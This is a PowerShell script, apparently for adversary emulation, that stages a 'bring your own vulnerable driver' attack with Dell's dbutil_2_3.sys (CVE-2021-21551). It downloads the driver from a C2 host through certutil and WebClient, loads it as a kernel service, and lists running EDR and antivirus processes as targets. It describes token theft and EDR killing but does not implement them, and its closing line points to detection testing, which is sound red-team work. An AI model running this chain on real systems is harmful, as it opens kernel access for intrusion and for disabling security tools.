param(
    [Parameter(Mandatory=$true)]
    [string]$C2Host
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting BYOVD - Dell dbutil Driver Exploit..." -ForegroundColor Cyan

# T1562.001 - Impair Defenses: Disable or Modify Tools
# T1068 - Exploitation for Privilege Escalation
# Uses vulnerable Dell dbutil_2_3.sys driver (CVE-2021-21551) for kernel access

Write-Host "[*] [T1562.001] BYOVD via dbutil_2_3.sys (CVE-2021-21551)" -ForegroundColor Yellow
Write-Host "[!] Dell firmware update driver - arbitrary kernel read/write" -ForegroundColor Yellow
Write-Host "[!] Used by: Lazarus APT Group (North Korea)" -ForegroundColor Yellow
Write-Host "[!] Requires: Local Administrator privileges" -ForegroundColor Yellow

$driverDir = "C:\temp\drivers"
New-Item -ItemType Directory -Path $driverDir -Force | Out-Null

# Step 1: Download vulnerable driver
Write-Host "`n[*] [T1105] Downloading dbutil_2_3.sys..."
$driverPath = "$driverDir\dbutil_2_3.sys"
certutil -urlcache -split -f "http://$C2Host/tools/dbutil_2_3.sys" $driverPath

if (-not (Test-Path $driverPath)) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/dbutil_2_3.sys", $driverPath)
    } catch {}
}

if (Test-Path $driverPath) {
    Write-Host "[+] Driver downloaded: $driverPath" -ForegroundColor Green
    
    # Step 2: Check driver signature
    Write-Host "`n[*] Verifying driver signature..."
    $sig = Get-AuthenticodeSignature $driverPath -ErrorAction SilentlyContinue
    Write-Host "    Signer: $($sig.SignerCertificate.Subject)"
    
    # Step 3: Load driver
    Write-Host "`n[*] [T1543.003] Loading Dell dbutil driver..."
    $serviceName = "dbutil_2_3"
    sc.exe create $serviceName type=kernel binPath=$driverPath 2>&1
    sc.exe start $serviceName 2>&1
    
    Start-Sleep -Seconds 2
    $driverLoaded = Get-Service $serviceName -ErrorAction SilentlyContinue
    if ($driverLoaded) {
        Write-Host "[+] Dell dbutil driver loaded" -ForegroundColor Green
    } else {
        Write-Host "[!] Driver may be blocked (HVCI, driver blocklist)" -ForegroundColor Yellow
    }
    
    # Step 4: CVE-2021-21551 exploitation methodology
    Write-Host "`n[*] CVE-2021-21551 Exploitation Chain:" -ForegroundColor Cyan
    Write-Host "    1. Driver exposes IOCTL with insufficient access control"
    Write-Host "    2. Attacker sends crafted IOCTL to gain kernel R/W"
    Write-Host "    3. Overwrite process token to SYSTEM"
    Write-Host "    4. Use SYSTEM token to kill EDR processes"
    Write-Host "    5. Deploy malicious payloads without detection"
    
    # Step 5: Enumerate security processes
    Write-Host "`n[*] Security processes that would be targeted:"
    $secProcs = Get-Process | Where-Object {
        $_.Name -match "MsMpEng|MsSense|CrowdStrike|CSFalcon|Cylance|SentinelAgent|Tanium|Cortex|Sophos|ESET|Kaspersky|McAfee|Symantec"
    }
    if ($secProcs) {
        $secProcs | ForEach-Object {
            Write-Host "    [!] Target: $($_.Name) (PID: $($_.Id))" -ForegroundColor Red
        }
    } else {
        Write-Host "    [*] No known EDR processes detected"
    }
    
    # Step 6: Cleanup
    Write-Host "`n[*] Cleaning up..."
    sc.exe stop $serviceName 2>&1
    sc.exe delete $serviceName 2>&1
    Write-Host "[+] Driver service removed" -ForegroundColor Green
    
} else {
    Write-Host "[-] Driver download failed" -ForegroundColor Red
}

Write-Host "`n[+] BYOVD dbutil Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Dell dbutil driver load, CVE-2021-21551, Lazarus APT association" -ForegroundColor Yellow
